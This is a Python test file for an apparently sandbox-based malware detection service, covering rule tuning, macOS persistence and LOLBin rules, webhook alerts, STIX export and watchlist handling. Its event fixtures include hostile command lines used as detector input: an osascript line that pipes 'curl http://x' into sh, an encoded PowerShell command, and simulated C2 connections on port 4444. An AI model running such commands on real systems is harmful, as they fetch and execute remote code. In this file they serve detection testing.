"""Tests for roadmap items 2.3 (rule tuning), 3.1 (notifications), 3.2
(macOS rules), and 3.3 (STIX export + watchlist import/export)."""

from datetime import datetime, timedelta, timezone

from .conftest import make_run
from ..services import detection, stix as stix_service


def _ts(offset_seconds: int) -> str:
    return (datetime.now(timezone.utc) - timedelta(seconds=offset_seconds)).isoformat()


def _linux_conn(run_id: str, ip: str, ts: str, pid: int = 3000) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "network_connection",
        "timestamp": ts, "pid": pid, "dest_ip": ip, "dest_port": 4444, "protocol": "tcp",
    }


def _macos_write(run_id: str, path: str, ts: str, pid: int = 1000) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "file_write",
        "timestamp": ts, "pid": pid, "file_path": path,
    }


def _proc(run_id: str, name: str, cmdline: str, ts: str, pid: int, ppid: int = 1) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "process_create",
        "timestamp": ts, "pid": pid, "ppid": ppid, "process_name": name, "command_line": cmdline,
    }


# -- Roadmap 2.3: rule tuning ---------------------------------------------------


def test_tuning_list_exposes_defaults(client):
    resp = client.get("/rules/tuning")
    assert resp.status_code == 200
    body = resp.json()
    assert body["count"] >= 5
    by_param = {k["param"]: k for k in body["knobs"]}
    assert by_param["BEACON_MIN_CONNECTIONS"]["default"] == 5
    assert by_param["BEACON_MIN_CONNECTIONS"]["tuned"] is False


def test_tuning_set_and_reset(client):
    resp = client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "3"})
    assert resp.status_code == 200
    assert resp.json()["current"] == "3"

    body = client.get("/rules/tuning").json()
    knob = next(k for k in body["knobs"] if k["param"] == "BEACON_MIN_CONNECTIONS")
    assert knob["current"] == 3 and knob["tuned"] is True

    # Setting 422s on a non-numeric value for an int knob.
    bad = client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "abc"})
    assert bad.status_code == 422

    resp = client.delete("/rules/tuning/BEACON_MIN_CONNECTIONS")
    assert resp.status_code == 204
    body = client.get("/rules/tuning").json()
    knob = next(k for k in body["knobs"] if k["param"] == "BEACON_MIN_CONNECTIONS")
    assert knob["tuned"] is False and knob["current"] == 5


def test_tuning_changes_detection_behavior(client):
    """Lower BEACON_MIN_CONNECTIONS → a 3-connection beacon now fires."""
    run_id = client.post("/runs", json={"sample_name": "tune.bin", "platform": "linux"}).json()["run_id"]
    assert client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "3"}).status_code == 200
    try:
        for i in range(3):
            client.post(
                "/ingest/batch",
                json=[_linux_conn(run_id, "203.0.113.99", _ts(30 - i * 2), pid=3000 + i)],
            )
        alerts = client.get(f"/runs/{run_id}/alerts").json()
        assert any(a["rule_id"] == "beaconing" for a in alerts)
    finally:
        client.delete("/rules/tuning/BEACON_MIN_CONNECTIONS")


# -- Roadmap 3.2: macOS rules ----------------------------------------------------


def test_macos_run_create_allowed(client):
    resp = client.post("/runs", json={"sample_name": "mac.bin", "platform": "macos"})
    assert resp.status_code == 201
    assert resp.json()["run_id"]


def test_macos_launchagent_persistence_fires(client):
    run_id = client.post("/runs", json={"sample_name": "launch.bin", "platform": "macos"}).json()["run_id"]
    client.post("/ingest/batch", json=[_macos_write(run_id, "/Library/LaunchDaemons/com.evil.plist", _ts(5))])
    alerts = client.get(f"/runs/{run_id}/alerts").json()
    assert any(a["rule_id"] == "autostart-persistence" for a in alerts)


def test_macos_osascript_lolbin_fires(client):
    run_id = client.post("/runs", json={"sample_name": "osa.bin", "platform": "macos"}).json()["run_id"]
    client.post(
        "/ingest/batch",
        json=[
            _proc(
                run_id, "osascript",
                "osascript -e 'do shell script \"curl http://x | sh\"'",
                _ts(5), pid=2000,
            )
        ],
    )
    alerts = client.get(f"/runs/{run_id}/alerts").json()
    assert any(a["rule_id"] == "lolbin-abuse" and "osascript" in a["details"] for a in alerts)


def test_macos_windows_event_does_not_fire_linux_rule(client):
    # A windows-path write that merely contains a macOS string must not fire.
    run_id = client.post("/runs", json={"sample_name": "w.bin", "platform": "windows"}).json()["run_id"]
    client.post(
        "/ingest/batch",
        json=[{
            "run_id": run_id, "platform": "windows", "event_type": "file_write",
            "timestamp": _ts(5), "pid": 1,
            "file_path": r"C:\\Users\\victim\\LaunchAgents\\evil.plist",
        }],
    )
    assert client.get(f"/runs/{run_id}/alerts").json() == []


# -- Roadmap 3.1: notifications ---------------------------------------------------


def test_runs_filter_by_sample_name(client):
    """Sample vault → detonation history: GET /runs?q=<sample> filters."""
    a = make_run(client, sample_name="qfilter-sample-a.exe")
    make_run(client, sample_name="qfilter-sample-b.exe")
    hit = client.get("/runs", params={"q": "qfilter-sample-a"}).json()
    assert [r["run_id"] for r in hit] == [a]
    miss = client.get("/runs", params={"q": "no-such-sample-xyz"}).json()
    assert miss == []


def test_notifications_settings_roundtrip(client):
    resp = client.put("/notifications/settings", json={"webhook_url": "http://hook.local/x"})
    assert resp.status_code == 200
    assert resp.json()["enabled"] is True
    got = client.get("/notifications/settings").json()
    assert got["webhook_url"] == "http://hook.local/x"

    client.put("/notifications/settings", json={"webhook_url": ""})
    assert client.get("/notifications/settings").json()["enabled"] is False


def test_webhook_fires_on_malicious_alert(client, monkeypatch):
    """A malicious alert POSTs to the webhook; a clean/suspicious one doesn't."""
    captured: list[dict] = []

    class FakeResp:
        def raise_for_status(self):
            return None

    class FakeClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def post(self, url, json=None):
            captured.append({"url": url, "json": json})
            return FakeResp()

    import httpx

    monkeypatch.setattr(httpx, "AsyncClient", FakeClient)
    client.put("/notifications/settings", json={"webhook_url": "http://hook.test/alert"})

    from ..services.notifications import _payload
    from ..core.schema import Alert

    alerts = [
        Alert(
            run_id="x", rule_id="lolbin-abuse", rule_name="LOLBin", severity="malicious",
            triggered_at=datetime.now(timezone.utc), details="bad",
        ),
        Alert(
            run_id="x", rule_id="first-seen", rule_name="Novelty", severity="suspicious",
            triggered_at=datetime.now(timezone.utc), details="meh",
        ),
    ]
    import asyncio

    urls = asyncio.run(_send(client, alerts))
    assert urls == ["http://hook.test/alert"]
    assert len(captured) == 1  # only the malicious one
    assert captured[0]["json"]["severity"] == "malicious"


async def _send(client, alerts):
    # Import inside to avoid a circular import at module scope.
    from ..services.notifications import notify_new_alerts

    return await notify_new_alerts(alerts)


# -- Roadmap 3.3: STIX export ------------------------------------------------------


def test_stix_export_bundle_shape(client):
    run_id = client.post("/runs", json={"sample_name": "stix.bin", "platform": "windows"}).json()["run_id"]
    client.post(
        "/ingest/batch",
        json=[{
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(3), "pid": 1, "ppid": 0, "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgA",
        }],
    )
    # A malicious C2 connection gives the bundle its IP indicator.
    client.post(
        "/ingest/batch",
        json=[{
            "run_id": run_id, "platform": "windows", "event_type": "network_connection",
            "timestamp": _ts(2), "pid": 1, "dest_ip": "203.0.113.77", "dest_port": 4444,
        }],
    )
    bundle = client.get(f"/runs/{run_id}/export?format=stix").json()
    assert bundle["type"] == "bundle"
    assert bundle["spec_version"] == "2.1"
    types = {o["type"] for o in bundle["objects"]}
    assert "x-outpost-run" in types
    assert any(o["type"] == "indicator" for o in bundle["objects"])
    assert any(o["type"] == "observed-data" for o in bundle["objects"])
    # All ids are STIX-shaped.
    for o in bundle["objects"]:
        assert "--" in o["id"]


def test_stix_unknown_run_404(client):
    resp = client.get("/runs/nope/export?format=stix")
    assert resp.status_code == 404


# -- Roadmap 3.3: watchlist import/export ------------------------------------------


def test_watchlist_export_import_roundtrip(client):
    client.post("/watchlist", json={"value": "203.0.113.50", "label": "shared c2"})
    client.post("/watchlist", json={"value": "evil.example.com"})

    js = client.get("/watchlist/export?format=json").json()
    assert {"value": "203.0.113.50", "label": "shared c2"} in js

    # Remove just this test's two entries (the session DB may hold entries
    # from other tests), then re-import — labels must survive the roundtrip.
    for value in ("203.0.113.50", "evil.example.com"):
        client.delete(f"/watchlist/{value}")

    # Re-import only this test's two entries (the session DB may carry rows
    # added by earlier tests — they must not affect our count).
    mine = [e for e in js if e["value"] in ("203.0.113.50", "evil.example.com")]
    resp = client.post("/watchlist/import", json={"entries": mine})
    assert resp.status_code == 200
    assert resp.json()["imported"] == 2
    entries = client.get("/watchlist").json()
    labels = {e["value"]: e["label"] for e in entries}
    assert labels["203.0.113.50"] == "shared c2"
    assert labels["evil.example.com"] == "evil.example.com"


def test_watchlist_csv_export(client):
    client.post("/watchlist", json={"value": "1.2.3.4"})
    resp = client.get("/watchlist/export?format=csv")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")
    assert "1.2.3.4" in resp.text
